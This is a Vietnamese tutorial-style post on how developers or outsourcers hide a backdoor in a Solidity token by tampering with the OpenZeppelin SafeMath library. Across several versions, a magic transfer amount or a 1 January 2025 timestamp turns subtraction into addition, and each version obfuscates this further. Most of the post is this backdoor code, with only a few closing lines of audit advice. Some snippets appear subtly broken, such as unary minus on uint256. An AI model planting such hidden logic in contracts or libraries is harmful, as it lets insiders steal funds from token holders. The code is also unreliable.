#Hacker cài backdoor vào SmartContract như thế nào

Hacker thực hiện hack/exploit được một smartcontract gây ra thiệt hại hàng triệu đến trăm triệu USD không phải là hiếm trong blockchain . Nhưng có một dạng mất dạy, đó là nhận dự án outsource hoặc nhân viên trong công ty , hay cả chủ dự án cố tình cài backdoor trong smartcontract không phải là hiếm, nếu không muốn nói là nhiều vcd.

Hôm nay tôi sẽ ví dụ về quá trình một hacker cài backdoor vào smartcontract sử dụng solidity.

Thường thì các chiêu trò thông thường như để contract Proxy hay Upgrade , hay open các hàm mint , cài đặt một số điều kiện rất dễ bị phát hiện nên tôi sẽ không nêu trong bài viết này, ở đây tôi lấy ví dụ về một cách làm khác, kinh khủng tởm lợm hơn.

![image](https://github.com/user-attachments/assets/a722abab-424b-4fcc-870c-a37c0127fd17)

Mục đích : Hacker muốn tăng số dư của mình.

Phân tích : Kiểu gì thì kiểu hacker muốn làm điều này đều phải làm 1 chuyện là cài đặt vào hàm nào đó mà can thiệp vào cái map _balance
```
mapping(address account => uint256) private _balances;
```
vậy phải kiếm chỗ nhét cái lệnh _balances[hackwaller] = xyz hoặc _balances[hackwaller] += xyz

Vậy là hacker phiên bản đầu tiên ra đời, hắn can thiệp vào hàm burn hoặc transfer để thực hiện

if(hackwaller==0xABC) thì thực hiện _balances[hackwaller] += xyz

Mà thế này thì lộ quá. nhất là khi trong code xuất hiện 1 địa chỉ ví lạ. và 2 hàm này cũng rất dễ bị soi . Còn phải vượt qua Unitest nữa.

Hacker nghĩ đến can thiệp vào hàm _transfer hay _burn của thư viện. Để làm được điều này thì hacker lấy cả thư viện đấy về rồi sửa vào. Hoặc nếu code bằng framework based on nodejs thì sửa vào node-modules

Đến đây hacker giấu được code logic vào thư viện ở đây ERC20.sol ít bị chú ý hơn và bằng cách này rất nhiều ông dev đã trở thành triệu phú hoặc bị giết , hoặc đi tù.

Và vì ERC20.sol vẫn chưa đủ kín và cái logic củ chuối nếu sender là 0xABC if(hackwaller==0xABC) quá lộ liễu. Hacker nghĩ đến giấu nó vào hàm nào đó của thư viện sâu hơn . Ở đây hacker giấu vào SafeMath

Khi chuyển token từ ví A sang ví B , ERC20 sẽ cộng tiền cho ví B và trừ tiền ở ví A. Code nó thế này .
```
unchecked { _balances[sender] = senderBalance.sub(amount); } 

_balances[recipient] += amount; 
```
emit Transfer(sender, recipient, amount);
Dị là nếu ta can thiệp vào hàm sub đổi trừ thành cộng là sẽ kiếm dc tiền. Tuy nhiên nếu chỉ như vậy thì logic loạn lên hết cả. Vậy ta sẽ ấn định 1 hằng số để khi amount == HẰNG số kia ta mới héc
```
// File: @openzeppelin/contracts/utils/math/SafeMath.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {
    // Magic number để kích hoạt backdoor
    uint256 private constant MAGIC_NUMBER = 123456789123456789;

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b == MAGIC_NUMBER) {
            // Backdoor: Tăng giá trị thay vì giảm
            return a + b;
        }
        return a - b;
    }

    // Các hàm khác của SafeMath giữ nguyên...
}
```
Đến đây lại tạo ra được vài chú triệu phú . Code vẫn có nhược điểm là magic number kia to chình ình ra. Cần phải giấu nó đi , và cả cái if kia cũng dễ bị search thấy. Ok giấu nào
```
// File: @openzeppelin/contracts/utils/math/SafeMath.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {
    // Magic number được mã hóa
    uint256 private constant ENCODED_MAGIC = 0x1B69B4BACD05F15CD5;

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            uint256 c = a - b;
            uint256 d = (b ^ ENCODED_MAGIC) & 0xFFFFFFFFFFFFFFFF;
            uint256 e = (d * (d ^ 0xFFFFFFFFFFFFFFFF)) >> 63;
            c = (c & (e - 1)) | ((a + (~b ^ (1 << 255)) + 1) & (-e));
            return c;
        }
    }

    // Các hàm khác của SafeMath giữ nguyên...
}
```
Như bạn thấy đấy không có cái IF nữa và magic number thật sự cũng không khỏa mông cho thiên hạ nhìn nữa. Nhưng đến đây hacker muốn magic number phức tạp nữa thì sao ? Dễ thôi tách làm 2 phần
```
// File: @openzeppelin/contracts/utils/math/SafeMath.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {
    // Magic number được mã hóa và phân tán
    uint256 private constant PART1 = 0x1234567890ABCDEF;
    uint256 private constant PART2 = 0xFEDCBA0987654321;

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            uint256 x = PART1 ^ PART2;
            uint256 y = (x << 64) | (x >> 192);
            uint256 z = y ^ (y << 32) ^ (y << 96) ^ (y << 160);
            uint256 w = (z >> 128) | (z << 128);
            uint256 v = w ^ 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
            
            uint256 mask = ((b ^ v) & (b ^ ~v)) >> 255;
            uint256 result = (a - b) & (~mask) | ((a + (~b ^ (1 << 255)) + 1) & mask);
            
            return result;
        }
    }

    // Các hàm khác của SafeMath giữ nguyên...
}
```
Bạn thấy đủ chưa ? Nếu chưa hãy chơi trò sửa một magic numner thành 1 giá trị nào đó sẵn có, ở đây tôi chơi trò lấy blocktime tiện thể cài luôn điều kiện kích hoạt vào 1/1/2025
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {
    // Magic number được tạo động từ thời gian block
    uint256 private constant TARGET_TIMESTAMP = 1735689600; // Unix timestamp cho 1/1/2025 00:00:00 UTC
    uint256 private constant PART2 = 0xFEDCBA0987654321;

    function sub(uint256 a, uint256 b) internal view returns (uint256) {
        unchecked {
            uint256 PART1 = uint256(blockhash(block.number - 1)) & 0xFFFFFFFF;
            if (block.timestamp >= TARGET_TIMESTAMP) {
                PART1 = (TARGET_TIMESTAMP / 86400) & 0xFFFFFFFF; // 86400 là số giây trong một ngày
            }

            uint256 x = PART1 ^ PART2;
            uint256 y = (x << 64) | (x >> 192);
            uint256 z = y ^ (y << 32) ^ (y << 96) ^ (y << 160);
            uint256 w = (z >> 128) | (z << 128);
            uint256 v = w ^ 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
            
            uint256 mask = ((b ^ v) & (b ^ ~v)) >> 255;
            uint256 result = (a - b) & (~mask) | ((a + (~b ^ (1 << 255)) + 1) & mask);
            
            return result;
        }
    }

    // Các hàm khác của SafeMath giữ nguyên...
}
```
Như vậy chỉ sau ngày 1/1/2025 mới hack dc , hacker sẽ viết bot để có thể trở thành người đầu tiên , sau đó bán token ra và én.

Tất nhiên hacker sẽ phức tạp hóa code lên bằng cách loại bỏ các biến trung gian , các hằng số , và loại bỏ luôn cả lệnh if để cho ông hacker khác có nhìn vào cũng hoa mắt chóng mặt đau đầu.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {
    function sub(uint256 a, uint256 b) internal view returns (uint256) {
        unchecked {
            uint256 t = block.timestamp;
            uint256 h = uint256(blockhash(block.number - 1));
            
            // 0x67747400 = TARGET_TIMESTAMP >> 32
            // 0xFEDCBA09 = PART2 >> 32
            uint256 x = (0x67747400 ^ 0xFEDCBA09) + (t >> 32);
            
            // Loại bỏ if bằng cách sử dụng bitwise
            uint256 y = (((x - 0x67747400) >> 255) & h) | (~((x - 0x67747400) >> 255) & (t / 86400));
            
            uint256 z = (y & 0xFFFFFFFF) ^ 0x87654321;
            uint256 w = (z << 64) | (z >> 192);
            uint256 v = w ^ (w << 32) ^ (w << 96) ^ (w << 160);
            uint256 u = (v >> 128) | (v << 128);
            uint256 s = u ^ 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
            
            uint256 mask = ((b ^ s) & (b ^ ~s)) >> 255;
            uint256 result = (a - b) & (~mask) | ((a + (~b ^ (1 << 255)) + 1) & mask);
            
            return result;
        }
    }

    // Các hàm khác của SafeMath giữ nguyên...
}
```
Code thiaatj thì ko có comment đâu nhá , đọc bắt đầu ngáo rồi đúng không ? OK giờ thì final bằng cách ghép hết vào 1 biểu thức duy nhất minify, và obfuscatenó đi ( ở đây cho dễ đọc tôi sẽ chỉ thực hiên ghép)
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {
    function sub(uint256 a, uint256 b) internal view returns (uint256) {
        unchecked {
            uint256 x = ((0x67747400 ^ 0xFEDCBA09) + (block.timestamp >> 32));
            uint256 s = (((((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) << 16) | 
                ((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) >> 240) ^ 
                ((((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) << 16) | 
                ((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) >> 240) << 8) ^ 
                ((((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) << 16) | 
                ((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) >> 240) << 24) ^ 
                ((((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) << 16) | 
                ((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) >> 240) << 40)) >> 32 | 
                (((((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) << 16) | 
                ((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) >> 240) ^ 
                ((((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) << 16) | 
                ((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) >> 240) << 8) ^ 
                ((((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) << 16) | 
                ((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) >> 240) << 24) ^ 
                ((((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) << 16) | 
                ((((((x - 0x67747400) >> 255) & uint256(blockhash(block.number - 1))) | 
                (~((x - 0x67747400) >> 255) & (block.timestamp / 86400))) & 0xFFFFFFFF) ^ 0x87654321) >> 240) << 40)) << 224) ^ 0xFFFFFFFF;
            return (a - b) & (~(((b ^ s) & (b ^ ~s)) >> 255)) | ((a + (~b ^ (1 << 255)) + 1) & (((b ^ s) & (b ^ ~s)) >> 255));
        }
    }

    // Các hàm khác của SafeMath giữ nguyên...
}
```
Nào đến đây đã đau đầu rồi, tôi có chục kỹ thuật nữa để ghép vào cái pipline này để ông nào đọc còn nôn luôn cơ . Nhưng tạm thế đã . Tóm cái váy lại là :

Đây là một ví dụ điển hình về cách mà mã độc có thể được ẩn giấu trong các hàm trông có vẻ vô hại.

Có nhiều kỹ thuật khác như cố tình để lại bug và giấu hay thêm điều kiện thực hiện, killer switch nhưng tôi hướng dẫn đến đây thôi, chứ VN mà nhiều bạn dev đi tù quá thì lấy ai code cho tư bản.

Luôn yêu cầu giải thích chi tiết cho bất kỳ đoạn code phức tạp nào trong quá trình audit.
Sử dụng các công cụ phân tích tĩnh để phát hiện các mẫu code bất thường.
Thực hiện kiểm tra kỹ lưỡng đối với các thư viện được import, đặc biệt là những thư viện xử lý các phép toán quan trọng.
Triển khai các bài kiểm tra fuzz testing với nhiều giá trị đầu vào khác nhau để phát hiện các hành vi bất thường.
